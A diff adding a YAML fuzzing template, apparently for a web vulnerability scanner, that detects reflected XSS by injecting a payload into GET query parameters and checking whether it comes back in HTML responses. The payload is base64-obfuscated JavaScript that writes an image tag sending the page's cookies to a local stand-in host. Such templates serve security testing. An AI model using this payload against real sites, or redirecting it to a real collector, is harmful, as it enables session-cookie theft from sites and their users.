@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-cookie
+
+info:
+  name: Custom Reflection XSS with Cookie Retrieval
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a payload that writes an image element with the document's cookies.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
